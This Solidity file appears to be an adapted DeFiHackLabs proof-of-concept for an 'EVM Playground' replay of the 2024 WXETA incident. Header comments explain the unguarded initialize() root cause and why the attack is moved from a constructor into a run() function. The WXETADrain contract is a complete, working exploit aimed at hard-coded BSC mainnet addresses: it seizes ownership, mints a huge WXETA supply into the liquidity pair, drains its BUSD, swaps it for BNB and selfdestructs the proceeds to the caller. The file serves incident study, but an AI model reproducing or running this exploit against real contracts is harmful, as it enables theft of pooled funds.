// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-09-WXETA).
// The DeFiHackLabs PoC (test/WXETA_exp.sol) runs the ENTIRE attack inline in
// the `AttackerC` CONSTRUCTOR: claim ownership of the un-guarded WXetaDiamond
// facet via initialize(), mint 1e33 WXETA straight into the WXETA/BUSD pair,
// drain the pair's BUSD via a direct swap(), sell the BUSD for BNB through
// PancakeRouter, tip a fixed address, then selfdestruct(msg.sender) to
// forward the remaining native balance to the attacker. Because the whole
// attack is constructor code, and the playground's deploy call is UNRECORDED
// (constructor noise is never stepped), the attack is moved here into a
// callable run() entrypoint so it becomes the RECORDED call (mirrors the
// 2025-06-FixedTokenBSwap.mjs fix pattern for other constructor-only PoCs).
//
// One behavioral addition is required beyond a straight copy-paste:
// PancakeRouter.swapExactTokensForETH() unwraps WBNB and sends native BNB to
// `address(this)` via a raw value call. Inside the ORIGINAL constructor this
// always succeeds because the account has no code yet while it is still
// being constructed (any CALL to a codeless account is a no-op value
// transfer). Once the same logic runs from a callable function AFTER the
// contract is fully deployed, the account has real runtime bytecode with no
// matching receive/fallback, so the same raw value call would revert without
// one. A `receive() external payable {}` is added purely to preserve this
// constructor-time behavior for the post-deploy call — it changes nothing
// about the attack itself.
//
// All addresses, call sequence, and logic are otherwise copied verbatim from
// test/WXETA_exp.sol's AttackerC constructor.
//
// Root cause (see WXETA_exp.md): the WXETA facet's initialize(uint256 max) is
// public with no access control beyond a one-shot `!s.initialized` flag that
// was never flipped on-chain for this facet's diamond-storage namespace.
// Whoever calls it first becomes `owner` AND an `authorized` minter, and sets
// the mint cap (`_maxSupply`) to any value they like. mint() is gated only by
// `onlyAuthorized`, which the attacker just satisfied, so minting 1e33 WXETA
// directly into the pair inflates its reserves enough that a follow-up direct
// swap() drains almost the entire BUSD side while the constant-product
// k-check still (nominally) passes.

address constant WXetaDiamond = 0x05c2dD9cf547C6cCCF91245346E6E1BC9926cae7;
address constant PancakePair = 0xF5a32e5E54a771B9d3C853143db74449B721C03B;
address constant PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
address constant BEP20Token = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
address constant addr1 = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant addr2 = 0x4848489f0b2BEdd788c696e2D79b6b69D7484848;

interface IWXetaDiamond {
    function mint(address, uint256) external returns (bool);
    function initialize(uint256) external;
}

interface IBEP20Token {
    function balanceOf(address) external returns (uint256);
    function approve(address, uint256) external returns (bool);
}

contract WXETADrain {
    // See file header: needed only because run() executes after deployment
    // (unlike the original constructor-time attack, which hits a codeless
    // account on any raw value transfer to itself).
    receive() external payable {}

    function run() external {
        IWXetaDiamond(WXetaDiamond).initialize(type(uint256).max);
        bool minted = IWXetaDiamond(WXetaDiamond).mint(PancakePair, 1000000000000000 * 1e18);

        uint256 balPair = IBEP20Token(BEP20Token).balanceOf(PancakePair);
        (bool s1, ) = PancakePair.call(
            abi.encodeWithSelector(
                bytes4(keccak256("swap(uint256,uint256,address,bytes)")),
                0,
                balPair - 1e18,
                address(this),
                bytes("")
            )
        );
        require(s1);
        bool ok = IBEP20Token(BEP20Token).approve(PancakeRouter, type(uint256).max);

        uint256 bal = IBEP20Token(BEP20Token).balanceOf(address(this));
        address[] memory path = new address[](2);
        path[0] = BEP20Token;
        path[1] = addr1;
        (bool s2, ) = PancakeRouter.call(
            abi.encodeWithSelector(
                bytes4(keccak256("swapExactTokensForETH(uint256,uint256,address[],address,uint256)")),
                bal,
                0,
                path,
                address(this),
                block.timestamp
            )
        );
        require(s2);
        payable(addr2).call{value: 10 ** 16}("");
        selfdestruct(payable(msg.sender));
    }
}
